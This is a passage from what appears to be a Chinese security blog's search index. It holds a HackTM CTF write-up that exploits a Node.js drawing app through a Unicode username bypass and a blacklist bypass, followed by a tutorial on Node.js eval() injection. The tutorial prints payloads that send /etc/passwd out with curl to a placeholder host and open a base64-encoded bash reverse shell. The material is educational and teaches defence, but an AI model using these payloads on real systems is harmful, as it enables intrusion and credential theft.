{ return { status: &quot;ok&quot;, data: data };}function err(msg = &quot;Something went wrong.&quot;) { return { status: &quot;error&quot;, message: msg };}function onlyUnique(value, index, self) { return self.indexOf(value) === index;}app.get(&quot;/&quot;, (req, res) =&gt; { // Get current board res.json(ok({ board: boardString }));});app.post(&quot;/init&quot;, (req, res) =&gt; { // Initialize new round and sign admin token // RSA protected! // POST // { // p:&quot;0&quot;, // q:&quot;0&quot; // } let { p = &quot;0&quot;, q = &quot;0&quot;, clearPIN } = req.body; let target = md5(config.n.toString()); let pwHash = md5( bigInt(String(p)) .multiply(String(q)) .toString() ); if (pwHash == target &amp;&amp; clearPIN === _clearPIN) { // Clear the board board = new Array(config.height) .fill(0) .map(() =&gt; new Array(config.width).fill(config.backgroundColor)); boardString = boardToStrings(); io.emit(&quot;board&quot;, { board: boardString }); } //Sign the admin ID let adminId = pwHash .split(&quot;&quot;) .map((c, i) =&gt; c.charCodeAt(0) ^ target.charCodeAt(i)) .reduce((a, b) =&gt; a + b); console.log(adminId); res.json(ok({ token: sign({ id: adminId }) }));});app.get(&quot;/flag&quot;, (req, res) =&gt; { // Get the flag // Only for root if (req.user.id == 0) { res.send(ok({ flag: flag })); } else { res.send(err(&quot;Unauthorized&quot;)); }});app.get(&quot;/serverInfo&quot;, (req, res) =&gt; { // Get server info // Only for logged in users let user = users[req.user.id] || { rights: [] }; let info = user.rights.map(i =&gt; ({ name: i, value: config[i] })); res.json(ok({ info: info }));});app.post(&quot;/paint&quot;, (req, res) =&gt; { // Paint on the canvas // Only for logged in users // POST // { // x:0, // y:0 // } let user = users[req.user.id] || {}; x = req.body.x; y = req.body.y; let color = user.color || 0x0; if (board[y] &amp;&amp; board[y][x] &gt;= 0) { board[y][x] = color; boardString = boardToStrings(); io.emit(&quot;change&quot;, { change: { pos: [x, y], color: color } }); res.send(ok()); } else { res.send(err(&quot;Invalid painting&quot;)); }});app.post(&quot;/updateUser&quot;, (req, res) =&gt; { // Update user color and rights // Only for admin // POST // { // color: 0xDEDBEE, // rights: [&quot;height&quot;, &quot;width&quot;, &quot;usersOnline&quot;] // } let uid = req.user.id; let user = users[uid]; if (!user || !isAdmin(user)) { res.json(err(&quot;You&apos;re not an admin!&quot;)); return; } let color = parseInt(req.body.color); users[uid].color = (color || 0x0) &amp; 0xffffff; let rights = req.body.rights || []; if (rights.length &gt; 0 &amp;&amp; checkRights(rights)) { users[uid].rights = user.rights.concat(rights).filter(onlyUnique); } res.json(ok({ user: users[uid] }));});app.post(&quot;/login&quot;, (req, res) =&gt; { // Login // POST // { // username: &quot;dumbo&quot;, // } let u = { username: req.body.username, id: uuidv4(), color: Math.random() &lt; 0.5 ? 0xffffff : 0x0, rights: [ &quot;message&quot;, &quot;height&quot;, &quot;width&quot;, &quot;version&quot;, &quot;usersOnline&quot;, &quot;adminUsername&quot;, &quot;backgroundColor&quot; ] }; if (isValidUser(u)) { users[u.id] = u; res.send(ok({ token: sign({ id: u.id }) })); } else { res.json(err(&quot;Invalid creds&quot;)); }});function isValidUser(u) { return ( u.username.length &gt;= 3 &amp;&amp; u.username.toUpperCase() !== config.adminUsername.toUpperCase() );}function boardToStrings() { return board.map(b =&gt; b.join(&quot;,&quot;));}function checkRights(arr) { let blacklist = [&quot;p&quot;, &quot;n&quot;, &quot;port&quot;]; for (let i = 0; i &lt; arr.length; i++) { const element = arr[i]; if (blacklist.includes(element)) { return false; } } return true;}server.listen(config.port, () =&gt; console.log(`Server listening on port ${config.port}!`)); &#x6574;&#x4E2A;&#x9898;&#x76EE;&#x5C31;&#x662F;&#x4E00;&#x4E2A;&#x5728;&#x7EBF;&#x753B;&#x56FE;&#x7684;&#x7A0B;&#x5E8F;&#xFF0C;&#x5F53;&#x8F93;&#x5165;&#x7528;&#x6237;&#x540D;&#x767B;&#x5F55;&#x4E4B;&#x540E;&#x5C31;&#x53EF;&#x4EE5;&#x5BF9;&#x7F51;&#x9875;&#x4E0A;&#x7684;&#x989C;&#x8272;&#x683C;&#x5B50;&#x8FDB;&#x884C;&#x64CD;&#x4F5C;&#x3002;(&#x8FD9;&#x4E0D;&#x662F;&#x91CD;&#x70B9;)&#x670D;&#x52A1;&#x7AEF;&#x4F7F;&#x7528;&#x4E86;express&#x6846;&#x67B6;&#xFF0C;&#x5E76;&#x4F7F;&#x7528;express-jwt&#x6765;&#x8FDB;&#x884C;&#x7528;&#x6237;&#x9A8C;&#x8BC1;&#x3002; &#x6BD4;&#x8F83;&#x91CD;&#x8981;&#x7684;&#x9875;&#x9762;&#x5206;&#x522B;&#x662F;&#xFF1A; /init &#x83B7;&#x53D6;POST&#x6570;&#x636E;&#x4E2D;&#x7684;p&#x548C;q&#x53C2;&#x6570;&#xFF0C;&#x6700;&#x7EC8;&#x751F;&#x6210;&#x4E00;&#x4E2A;adminId&#xFF0C;&#x8FD4;&#x56DE;&#x4E00;&#x4E2A;id=adminId&#x7684;&#x7528;&#x6237;token /serverInfo &#x6839;&#x636E;&#x7528;&#x6237;&#x7684;&#x6743;&#x9650;&#x8FD4;&#x56DE;config&#x5185;&#x7684;&#x4FE1;&#x606F; /updateUser &#x66F4;&#x65B0;&#x7528;&#x6237;&#x4FE1;&#x606F;&#xFF0C;&#x8BBE;&#x7F6E;&#x7528;&#x6237;&#x6743;&#x9650; /login &#x767B;&#x5F55;&#x8D26;&#x6237; /flag &#x83B7;&#x53D6;Flag &#x9006;&#x63A8;&#x6574;&#x4E2A;&#x8FC7;&#x7A0B;&#x7684;&#x8BDD;&#xFF0C;&#x5927;&#x6982;&#x662F;&#x8FD9;&#x6837;&#x7684;&#x601D;&#x8DEF;&#xFF1A; &#x600E;&#x4E48;&#x83B7;&#x53D6;Flag&#xFF1F;&#x8BBF;&#x95EE;Flag&#x9875;&#x9762;&#x9700;&#x8981;&#x5BF9;adminId&#x8FDB;&#x884C;&#x5224;&#x65AD;&#xFF0C;adminId&#x9700;&#x8981;&#x4E3A;0&#x624D;&#x80FD;&#x83B7;&#x53D6;&#x5F97;&#x5230;Flag&#x3002;&#x800C;adminId&#x662F;&#x53EF;&#x4EE5;&#x901A;&#x8FC7;/init&#x4F20;&#x9012;p&#x548C;q&#x53C2;&#x6570;&#x8FDB;&#x884C;&#x8BBE;&#x7F6E;&#x7684;&#x3002;&#x600E;&#x4E48;&#x5C06;adminId&#x8BBE;&#x7F6E;&#x4E3A;0&#x5462;&#xFF1F; &#x600E;&#x4E48;&#x5C06;adminId&#x8BBE;&#x7F6E;&#x4E3A;0&#xFF1F;&#x6765;&#x5177;&#x4F53;&#x770B;&#x4E00;&#x4E0B;/init&#x9875;&#x9762;&#xFF0C;&#x5B83;&#x4F1A;&#x83B7;&#x53D6;POST&#x6570;&#x636E;&#x4E2D;&#x7684;p&#x548C;q&#x53C2;&#x6570;&#xFF0C;&#x5E76;&#x6700;&#x7EC8;&#x751F;&#x6210;&#x4E00;&#x4E2A;adminId&#xFF1A; 123456789101112131415161718192021222324app.post(&quot;/init&quot;, (req, res) =&gt; { let { p = &quot;0&quot;, q = &quot;0&quot;, clearPIN } = req.body; // &#x4ECE;POST&#x6570;&#x636E;&#x5F53;&#x4E2D;&#x83B7;&#x53D6;&#x5F97;&#x5230;p&#x548C;q let target = md5(config.n.toString()); // target&#x662F;config&#x4E2D;n&#x7684;md5&#x52A0;&#x5BC6; let pwHash = md5( bigInt(String(p)) .multiply(String(q)) .toString() ); // &#x5C06;p&#x4E0E;p&#x76F8;&#x4E58; if (pwHash == target &amp;&amp; clearPIN === _clearPIN) { // &#x6E05;&#x7406;&#x9762;&#x677F; board = new Array(config.height) .fill(0) .map(() =&gt; new Array(config.width).fill(config.backgroundColor)); boardString = boardToStrings(); io.emit(&quot;board&quot;, { board: boardString }); } //Sign the admin ID let adminId = pwHash .split(&quot;&quot;) .map((c, i) =&gt; c.charCodeAt(0) ^ target.charCodeAt(i)) .reduce((a, b) =&gt; a + b); // &#x53D6;&#x5408;&#x503C; console.log(adminId); res.json(ok({ token: sign({ id: adminId }) }));}); node.js&#x4E2D;map&#x53EF;&#x4EE5;&#x53C2;&#x8003;&#xFF1A;Array.prototype.map() reduce&#x53EF;&#x4EE5;&#x53C2;&#x8003;&#xFF1A;Array.prototype.reduce() &#x4E00;&#x4E9B;&#x8BED;&#x53E5;&#x5DF2;&#x7ECF;&#x4F5C;&#x4E86;&#x6CE8;&#x91CA;&#xFF0C;&#x6700;&#x91CD;&#x8981;&#x7684;&#x5728;&#x540E;&#x9762;&#x7684;map((c, i) =&gt; c.charCodeAt(0) ^ target.charCodeAt(i))&#xFF0C;&#x8FD9;&#x4E2A;&#x8BED;&#x53E5;&#x7684;&#x4F5C;&#x7528;&#x5C31;&#x662F;&#x5C06;pwHash&#x4E2D;&#x7684;&#x6BCF;&#x4E00;&#x4F4D;&#x4E0E;target&#x4E2D;&#x7684;&#x76F8;&#x540C;&#x4F4D;&#x7F6E;&#x7684;&#x5B57;&#x7B26;&#x8FDB;&#x884C;&#x5F02;&#x6216;&#x3002;&#x6700;&#x540E;reduce&#x5C06;&#x5F02;&#x6216;&#x540E;&#x7684;&#x503C;&#x8FDB;&#x884C;&#x53D6;&#x548C;&#x3002; pwnHash&#x7684;&#x6765;&#x6E90;&#x662F;md5(p*q)&#xFF0C;target&#x7684;&#x6765;&#x6E90;&#x662F;md5(n)&#xFF0C;&#x5982;&#x679C;&#x60F3;&#x8981;&#x5B83;&#x4EEC;&#x5F02;&#x6216;&#x540E;&#x518D;&#x53D6;&#x548C;&#x7684;&#x503C;&#x4E3A;0&#x7684;&#x8BDD;&#xFF0C;&#x6211;&#x4EEC;&#x8BE5;&#x600E;&#x4E48;&#x505A;&#x5462;&#xFF1F; &#x6211;&#x4EEC;&#x9996;&#x5148;&#x5F97;&#x77E5;&#x9053;n&#x7684;&#x503C;&#x662F;&#x591A;&#x5C11;&#x3002;&#x5728;&#x77E5;&#x9053;n&#x7684;&#x60C5;&#x51B5;&#x4E0B;&#xFF0C;&#x5C06;p&#x8BBE;&#x7F6E;&#x4E3A;n&#x7684;&#x503C;&#xFF0C;q&#x8BBE;&#x7F6E;&#x4E3A;1&#x3002;(qp&#x4E92;&#x6362;&#x4E5F;&#x53EF;&#x4EE5;)&#x8FD9;&#x6837;pwnHash&#x548C;target&#x7684;&#x503C;&#x5C31;&#x4F1A;&#x76F8;&#x540C;&#x3002;&#x76F8;&#x540C;&#x7684;&#x503C;&#x8FDB;&#x884C;&#x5F02;&#x6216;&#x5C31;&#x4F1A;&#x4E3A;0&#xFF0C;&#x53D6;&#x548C;&#x4E4B;&#x540E;&#x4E5F;&#x4E3A;0&#x3002;&#x8FD9;&#x6837;&#x5C31;&#x53EF;&#x4EE5;&#x4F7F;adminId&#x4E3A;0&#x4E86;&#x3002;&#x9875;&#x9762;&#x6700;&#x7EC8;&#x8FD8;&#x4F1A;&#x8FD4;&#x56DE;id&#x4E3A;0&#x7684;token&#xFF0C;&#x5229;&#x7528;token&#x5C31;&#x53EF;&#x4EE5;&#x83B7;&#x53D6;flag&#x4E86;&#x3002; &#x90A3;&#x73B0;&#x5728;&#x7684;&#x95EE;&#x9898;&#x5C31;&#x662F;&#x600E;&#x4E48;&#x5F97;&#x5230;n&#x7684;&#x503C;&#x3002; &#x600E;&#x4E48;&#x83B7;&#x53D6;n&#x7684;&#x503C;&#xFF1F;&#x5728;&#x6E90;&#x7801;&#x4E2D;&#x53EF;&#x4EE5;&#x77E5;&#x9053;&#xFF0C;/serverInfo&#x4F1A;&#x6839;&#x636E;&#x7528;&#x6237;&#x7684;&#x6743;&#x9650;(right)&#x8FD4;&#x56DE;config&#x5185;&#x7684;&#x4FE1;&#x606F;&#x3002;&#x9ED8;&#x8BA4;&#x83B7;&#x53D6;&#x5F97;&#x5230;&#x7684;&#x503C;&#x4E2D;&#x662F;&#x6CA1;&#x6709;n&#x7684;&#xFF0C;&#x6240;&#x4EE5;&#x6211;&#x4EEC;&#x9700;&#x8981;&#x901A;&#x8FC7;/updateUser&#x9875;&#x9762;&#x6765;&#x8BBE;&#x7F6E;&#x5F53;&#x524D;&#x7528;&#x6237;&#x67E5;&#x770B;config&#x4FE1;&#x606F;&#x7684;&#x6743;&#x9650;&#x3002; &#x5148;&#x6765;&#x770B;&#x4E0B;/updateUser&#x9875;&#x9762;&#x7684;&#x6E90;&#x7801;&#xFF1A; 1234567891011121314151617181920212223app.post(&quot;/updateUser&quot;, (req, res) =&gt; { // Update user color and rights // Only for admin // POST // { // color: 0xDEDBEE, // rights: [&quot;height&quot;, &quot;width&quot;, &quot;usersOnline&quot;] // } let uid = req.user.id; let user = users[uid]; if (!user || !isAdmin(user)) { res.json(err(&quot;You&apos;re not an admin!&quot;)); return; } let color = parseInt(req.body.color); users[uid].color = (color || 0x0) &amp; 0xffffff; let rights = req.body.rights || []; if (rights.length &gt; 0 &amp;&amp; checkRights(rights)) { //&#x68C0;&#x67E5;rights users[uid].rights = user.rights.concat(rights).filter(onlyUnique); //&#x53BB;&#x91CD;&#x64CD;&#x4F5C; } res.json(ok({ user: users[uid] }));}); &#x6570;&#x636E;&#x5305;&#x683C;&#x5F0F;&#x4E3A;&#xFF1A; 1234{ color: 0xDEDBEE, rights: [&quot;height&quot;, &quot;width&quot;, &quot;usersOnline&quot;]} rights&#x90E8;&#x5206;&#x5C31;&#x662F;&#x8981;&#x6DFB;&#x52A0;&#x67E5;&#x770B;&#x7684;&#x6743;&#x9650;&#x3002; &#x5148;&#x4E0D;&#x770B;&#x524D;&#x9762;&#x662F;&#x5426;&#x4E3A;&#x7BA1;&#x7406;&#x5458;&#x7684;&#x5224;&#x65AD;&#xFF0C;&#x76F4;&#x63A5;&#x770B;&#x540E;&#x9762;&#x6DFB;&#x52A0;&#x6743;&#x9650;&#x65F6;&#x7684;&#x5224;&#x65AD;&#x3002;&#x8FD9;&#x91CC;&#x8C03;&#x7528;&#x4E86;checkRights()&#x6765;&#x8FDB;&#x884C;&#x6743;&#x9650;&#x68C0;&#x67E5;&#x3002; 12345678910function checkRights(arr) { let blacklist = [&quot;p&quot;, &quot;n&quot;, &quot;port&quot;]; for (let i = 0; i &lt; arr.length; i++) { const element = arr[i]; if (blacklist.includes(element)) { return false; } } return true;} &#x51FD;&#x6570;&#x4E2D;&#x8BBE;&#x7F6E;&#x4E86;&#x4E00;&#x4E2A;&#x9ED1;&#x540D;&#x5355;&#xFF0C;&#x4E0D;&#x5141;&#x8BB8;p&#x3001;n&#x3001;port&#x88AB;&#x6DFB;&#x52A0;&#x8FDB;&#x7528;&#x6237;&#x7684;&#x67E5;&#x770B;&#x6743;&#x9650;&#x4E2D;&#x3002;&#x9A8C;&#x8BC1;&#x65B9;&#x5F0F;&#x662F;&#x7528;for&#x5FAA;&#x73AF;&#x83B7;&#x53D6;&#x6BCF;&#x4E00;&#x4E2A;&#x6743;&#x9650;&#xFF0C;&#x67E5;&#x770B;&#x5176;&#x662F;&#x5426;&#x5728;blacklist&#x4E2D;&#x3002;&#x5982;&#x679C;&#x5B58;&#x5728;&#x5C31;&#x8FD4;&#x56DE;false&#xFF0C;&#x4E0D;&#x5B58;&#x5728;&#x5C31;&#x8FD4;&#x56DE;true&#x3002;&#x6240;&#x4EE5;&#x4F20;&#x9012;rights&#x7684;&#x4E0D;&#x80FD;&#x76F4;&#x63A5;&#x4F20;&#x9012;&#x201D;n&#x201D;&#x3002; &#x5148;&#x6765;&#x770B;/serverInfo&#x9875;&#x9762;&#x662F;&#x600E;&#x4E48;&#x83B7;&#x53D6;config&#x7684;&#x503C;&#x7684;&#xFF0C; 12345678app.get(&quot;/serverInfo&quot;, (req, res) =&gt; { // Get server info // Only for logged in users let user = users[req.user.id] || { rights: [] }; let info = user.rights.map(i =&gt; ({ name: i, value: config[i] })); res.json(ok({ info: info }));}); &#x8FD9;&#x91CC;&#x83B7;&#x53D6;config&#x7684;&#x503C;&#x5C31;&#x662F;&#x901A;&#x8FC7;config[i]&#x83B7;&#x53D6;&#x7684;(i&#x662F;&#x952E;&#x540D;)&#x3002;&#x90A3;&#x5982;&#x4F55;&#x4E0D;&#x76F4;&#x63A5;&#x4F20;&#x9012;&#x201D;n&#x201D;&#x800C;&#x5F97;&#x5230;n&#x7684;&#x503C;&#x5462;&#xFF1F; &#x8FD9;&#x91CC;&#x8981;&#x4E86;&#x89E3;javascript&#x4E2D;&#x6570;&#x7EC4;&#x53D6;&#x503C;&#x7684;&#x65B9;&#x5F0F;&#x3002;&#x5B9A;&#x4E49;&#x4E00;&#x4E2A;array1&#x6570;&#x7EC4;&#x5982;&#x56FE;&#xFF0C;&#x6CE8;&#x610F;&#x8D4B;&#x503C;&#x65F6;&#x7684;&#x53C2;&#x6570;&#x503C;&#xFF1A; &#x53EF;&#x4EE5;&#x770B;&#x5230;&#xFF0C;&#x6211;&#x8FD9;&#x91CC;&#x4F20;&#x9012;&#x7ED9;array1&#x7684;&#x952E;&#x503C;&#x662F;&#x4E00;&#x4E2A;&#x591A;&#x7EF4;&#x6570;&#x7EC4;&#xFF0C;&#x4F46;&#x662F;&#x540C;&#x6837;&#x53EF;&#x4EE5;&#x83B7;&#x53D6;&#x5F97;&#x5230;&#x6570;&#x7EC4;&#x4E2D;&#x952E;&#x540D;&#x4E3A;&#x201D;port&#x201D;&#x7684;&#x503C;&#x3002;(&#x8FD9;&#x79CD;&#x53D6;&#x503C;&#x7684;&#x65B9;&#x5F0F;&#x5728;python&#x3001;php&#x4E2D;&#x4E0D;&#x884C;) &#x7531;&#x4E8E;&#x8FD9;&#x6837;&#x7684;&#x53D6;&#x503C;&#x65B9;&#x5F0F;&#x662F;&#x53EF;&#x884C;&#x7684;&#xFF0C;&#x6240;&#x4EE5;&#x6211;&#x4EEC;&#x53EA;&#x9700;&#x8981;&#x7ED9;right&#x8D4B;&#x503C;&#x4E00;&#x4E2A;[&quot;n&quot;]&#x5C31;&#x53EF;&#x4EE5;&#x7ED5;&#x8FC7;&#x524D;&#x9762;&#x7684;&#x9ED1;&#x540D;&#x5355;&#x4E86;&#x3002; &#x597D;&#xFF0C;&#x73B0;&#x5728;&#x53EF;&#x4EE5;&#x53D6;&#x5230;n&#x4E86;&#xFF0C;&#x518D;&#x6765;&#x770B;&#x770B;&#x600E;&#x4E48;&#x767B;&#x9646;&#x7BA1;&#x7406;&#x5458;&#x7528;&#x6237;&#x540D;&#x3002; &#x600E;&#x4E48;&#x4F7F;&#x7528;&#x7BA1;&#x7406;&#x5458;&#x7528;&#x6237;&#x540D;&#x767B;&#x9646;&#xFF1F;&#x767B;&#x9646;&#x9875;&#x9762;/login&#x4E2D;&#x6709;&#x4E00;&#x4E2A;&#x51FD;&#x6570;&#x7528;&#x4E8E;&#x5224;&#x65AD;&#x7528;&#x6237;&#x540D;&#x662F;&#x5426;&#x4E3A;&#x5408;&#x7406;&#x7684;&#x7528;&#x6237;&#x540D;&#xFF1A; 1234567function isValidUser(u) { return ( u.username.length &gt;= 3 &amp;&amp; u.username.toUpperCase() !== config.adminUsername.toUpperCase() // &#x957F;&#x5EA6;&#x5927;&#x4E8E;3&#x5E76;&#x4E14;&#x4E0D;&#x80FD;&#x4E3A;adminUsername );} &#x5728;/updateUser&#x9875;&#x9762;&#x4E2D;&#x6709;&#x4E00;&#x4E2A;&#x51FD;&#x6570;&#x7528;&#x4E8E;&#x5224;&#x65AD;&#x7528;&#x6237;&#x662F;&#x5426;&#x4E3A;&#x7BA1;&#x7406;&#x5458;&#xFF1A; 123function isAdmin(u) { return u.username.toLowerCase() == config.adminUsername.toLowerCase();} &#x5728;&#x767B;&#x5F55;&#x65F6;&#xFF0C;isValidUser&#x51FD;&#x6570;&#x4F1A;&#x5BF9;&#x7528;&#x6237;&#x8F93;&#x5165;&#x7684;&#x7528;&#x6237;&#x540D;&#x8FDB;&#x884C;toUpperCase&#x5904;&#x7406;&#xFF0C;&#x518D;&#x4E0E;&#x7BA1;&#x7406;&#x5458;&#x7528;&#x6237;&#x540D;&#x8FDB;&#x884C;&#x5BF9;&#x6BD4;&#x3002;&#x5982;&#x679C;&#x8F93;&#x5165;&#x7684;&#x7528;&#x6237;&#x540D;&#x4E0E;&#x7BA1;&#x7406;&#x5458;&#x7528;&#x6237;&#x540D;&#x76F8;&#x540C;&#xFF0C;&#x5C31;&#x4E0D;&#x5141;&#x8BB8;&#x767B;&#x5F55;&#x3002; &#x4F46;&#x662F;&#x6211;&#x4EEC;&#x53EF;&#x4EE5;&#x770B;&#x5230;&#xFF0C;&#x5728;&#x4E4B;&#x540E;&#x7684;&#x4E00;&#x4E2A;&#x5224;&#x65AD;&#x7528;&#x6237;&#x662F;&#x5426;&#x4E3A;&#x7BA1;&#x7406;&#x5458;&#x7684;&#x51FD;&#x6570;&#x4E2D;&#xFF0C;&#x5BF9;&#x7528;&#x6237;&#x540D;&#x8FDB;&#x884C;&#x5904;&#x7406;&#x7684;&#x662F;toLowerCase&#x3002;&#x6240;&#x4EE5;&#x8FD9;&#x4E24;&#x4E2A;&#x5DEE;&#x5F02;&#xFF0C;&#x5C31;&#x53EF;&#x4EE5;&#x4F7F;&#x7528;&#x5927;&#x5C0F;&#x5199;&#x7279;&#x6027;&#x6765;&#x8FDB;&#x884C;&#x7ED5;&#x8FC7;&#x3002; &#x5927;&#x5C0F;&#x5199;&#x5DEE;&#x5F02;&#x53EF;&#x4EE5;&#x53C2;&#x8003;p&#x795E;&#x7684;&#x8FD9;&#x7BC7;&#x6587;&#x7AE0;&#xFF1A;Fuzz&#x4E2D;&#x7684;javascript&#x5927;&#x5C0F;&#x5199;&#x7279;&#x6027; &#x9898;&#x76EE;&#x4E2D;&#x9ED8;&#x8BA4;&#x7684;&#x7BA1;&#x7406;&#x5458;&#x7528;&#x6237;&#x540D;&#x4E3A;&#xFF1A;hacktm &#x6240;&#x4EE5;&#xFF0C;&#x6211;&#x4EEC;&#x6307;&#x5B9A;&#x767B;&#x5F55;&#x65F6;&#x7684;&#x7528;&#x6237;&#x540D;&#x4E3A;&#xFF1A;hac&#x212A;tm &#x5373;&#x53EF;&#x7ED5;&#x8FC7;isValidUser&#x548C;isAdmin&#x7684;&#x9A8C;&#x8BC1;&#x3002; &#x601D;&#x8DEF;&#x603B;&#x7ED3; &#x5229;&#x7528;javascript&#x5927;&#x5C0F;&#x5199;&#x7279;&#x6027;&#x4F7F;&#x7528;&#x7BA1;&#x7406;&#x5458;&#x7684;&#x7528;&#x6237;&#x540D;&#x767B;&#x5F55; &#x7ED9;&#x7528;&#x6237;&#x6DFB;&#x52A0;&#x67E5;&#x770B;n&#x7684;&#x6743;&#x9650;&#x5E76;&#x67E5;&#x770B;n&#x7684;&#x503C; &#x901A;&#x8FC7;&#x8D4B;&#x503C;p&#x3001;q&#x5C06;adminId&#x8BBE;&#x7F6E;&#x4E3A;0 &#x83B7;&#x53D6;Flag &#x8FC7;&#x7A0B;&#x590D;&#x73B0; &#x5229;&#x7528;javascript&#x5927;&#x5C0F;&#x5199;&#x7279;&#x6027;&#x4F7F;&#x7528;&#x7BA1;&#x7406;&#x5458;&#x7684;&#x7528;&#x6237;&#x540D;&#x767B;&#x5F55; &#x7ED9;&#x7528;&#x6237;&#x6DFB;&#x52A0;&#x67E5;&#x770B;n&#x7684;&#x6743;&#x9650;&#x5E76;&#x67E5;&#x770B;n&#x7684;&#x503C; &#x67E5;&#x770B;n&#x7684;&#x503C;&#xFF1A; &#x901A;&#x8FC7;&#x8D4B;&#x503C;p&#x3001;q&#x5C06;adminId&#x8BBE;&#x7F6E;&#x4E3A;0 &#x83B7;&#x53D6;Flag","link":"/2020/02/02/Hacktm-Nodejs/"},{"title":"Node.js 常见漏洞学习与总结","text":"&#x5371;&#x9669;&#x51FD;&#x6570;&#x6240;&#x5BFC;&#x81F4;&#x7684;&#x547D;&#x4EE4;&#x6267;&#x884C;eval()eval() &#x51FD;&#x6570;&#x53EF;&#x8BA1;&#x7B97;&#x67D0;&#x4E2A;&#x5B57;&#x7B26;&#x4E32;&#xFF0C;&#x5E76;&#x6267;&#x884C;&#x5176;&#x4E2D;&#x7684;&#x7684; JavaScript &#x4EE3;&#x7801;&#x3002;&#x548C;PHP&#x4E2D;eval&#x51FD;&#x6570;&#x4E00;&#x6837;&#xFF0C;&#x5982;&#x679C;&#x4F20;&#x9012;&#x5230;&#x51FD;&#x6570;&#x4E2D;&#x7684;&#x53C2;&#x6570;&#x53EF;&#x63A7;&#x5E76;&#x4E14;&#x6CA1;&#x6709;&#x7ECF;&#x8FC7;&#x4E25;&#x683C;&#x7684;&#x8FC7;&#x6EE4;&#x65F6;&#xFF0C;&#x5C31;&#x4F1A;&#x5BFC;&#x81F4;&#x6F0F;&#x6D1E;&#x7684;&#x51FA;&#x73B0;&#x3002;&#x7B80;&#x5355;&#x4F8B;&#x5B50;&#xFF1A; main.js 1234567891011var express = require(&quot;express&quot;);var app = express();app.get(&apos;/eval&apos;,function(req,res){ res.send(eval(req.query.q)); console.log(req.query.q);})var server = app.listen(8888, function() { console.log(&quot;&#x5E94;&#x7528;&#x5B9E;&#x4F8B;&#xFF0C;&#x8BBF;&#x95EE;&#x5730;&#x5740;&#x4E3A; http://127.0.0.1:8888/&quot;);}) &#x6F0F;&#x6D1E;&#x5229;&#x7528;&#xFF1A; Node.js&#x4E2D;&#x7684;chile_process.exec&#x8C03;&#x7528;&#x7684;&#x662F;/bash.sh&#xFF0C;&#x5B83;&#x662F;&#x4E00;&#x4E2A;bash&#x89E3;&#x91CA;&#x5668;&#xFF0C;&#x53EF;&#x4EE5;&#x6267;&#x884C;&#x7CFB;&#x7EDF;&#x547D;&#x4EE4;&#x3002;&#x5728;eval&#x51FD;&#x6570;&#x7684;&#x53C2;&#x6570;&#x4E2D;&#x53EF;&#x4EE5;&#x6784;&#x9020;require(&apos;child_process&apos;).exec(&apos;&apos;);&#x6765;&#x8FDB;&#x884C;&#x8C03;&#x7528;&#x3002; &#x5F39;&#x8BA1;&#x7B97;&#x5668;(windows)&#xFF1A; /eval?q=require(&apos;child_process&apos;).exec(&apos;calc&apos;); &#x8BFB;&#x53D6;&#x6587;&#x4EF6;(linux)&#xFF1A; /eval?q=require(&apos;child_process&apos;).exec(&apos;curl -F &quot;x=`cat /etc/passwd`&quot; http://vps&apos;);; &#x53CD;&#x5F39;shell(linux)&#xFF1A; /eval?q=require(&apos;child_process&apos;).exec(&apos;echo YmFzaCAtaSA%2BJiAvZGV2L3RjcC8xMjcuMC4wLjEvMzMzMyAwPiYx|base64 -d|bash&apos;); YmFzaCAtaSA%2BJiAvZGV2L3RjcC8xMjcuMC4wLjEvMzMzMyAwPiYx&#x662F;bash -i &gt;&amp; /dev/tcp/127.0.0.1/3333 0&gt;&amp;1 BASE64&#x52A0;&#x5BC6;&#x540E;&#x7684;&#x7ED3;&#x679C;&#xFF0C;&#x76F4;&#x63A5;&#x8C03;&#x7528;&#x4F1A;&#x62A5;&#x9519;&#x3002; &#x6CE8;&#x610F;&#xFF1A;BASE64&#x52A0;&#x5BC6;&#x540E;&#x7684;&#x5B57;&#x7B26;&#x4E2D;&#x6709;&#x4E00;&#x4E2A;+&#x53F7;&#x9700;&#x8981;url&#x7F16;&#x7801;&#x4E3A;%2B(&#x4E00;&#x5B9A;&#x60C5;&#x51B5;&#x4E0B;) &#x5982;&#x679C;&#x4E0A;&#x4E0B;&#x6587;&#x4E2D;&#x6CA1;&#x6709;require(&#x7C7B;&#x4F3C;&#x4E8E;Code-Breaking 2018 Thejs)&#xFF0C;&#x5219;&#x53EF;&#x4EE5;&#x4F7F;&#x7528;global.process.mainModule.constructor._load(&apos;child_process&apos;).exec(&apos;calc&apos;)&#x6765;&#x6267;&#x884C;&#x547D;&#x4EE4; paypal&#x4E00;&#x4E2A;&#x547D;&#x4EE4;&#x6267;&#x884C;&#x7684;&#x4F8B;&#x5B50;&#xFF1A; [demo.paypal.com] Node.js code injection (RCE) (&#x4F7F;&#x7528;&#x6570;&#x7EC4;&#x7ED5;&#x8FC7;&#x8FC7;&#x6EE4;&#xFF0C;&#x518D;&#x8C03;&#x7528;child_process&#x6267;&#x884C;&#x547D;&#x4EE4;) &#x7C7B;&#x4F3C;&#x547D;&#x4EE4;&#x95F4;&#x9694;&#x4E24;&#x79D2;&#x6267;&#x884C;&#x51FD;&#x6570;&#xFF1A; setInteval(some_function, 2000) &#x4E24;&#x79D2;&#x540E;&#x6267;&#x884C;&#x51FD;&#x6570;&#xFF1A; setTimeout(some_function, 2000); some_function&#x5904;&#x5C31;&#x7C7B;&#x4F3C;&#x4E8E;eval&#x51FD;&#x6570;&#x7684;&#x53C2;&#x6570; &#x8F93;&#x51FA;HelloWorld&#xFF1A; Function(&#x201C;console.log(&#x2018;HelloWolrd&#x2019;)&#x201D;)() &#x7C7B;&#x4F3C;&#x4E8E;php&#x4E2D;&#x7684;create_function &#x4EE5;&#x4E0A;&#x90FD;&#x53EF;&#x4EE5;&#x5BFC;&#x81F4;&#x547D;&#x4EE4;&#x6267;&#x884C; Node.js &#x539F;&#x578B;&#x6C61;&#x67D3;&#x6F0F;&#x6D1E;Javascript&#x539F;&#x578B;&#x94FE;&#x53C2;&#x8003;&#x6587;&#x7AE0;&#xFF1A;&#x7EE7;&#x627F;&#x4E0E;&#x539F;&#x578B;&#x94FE; 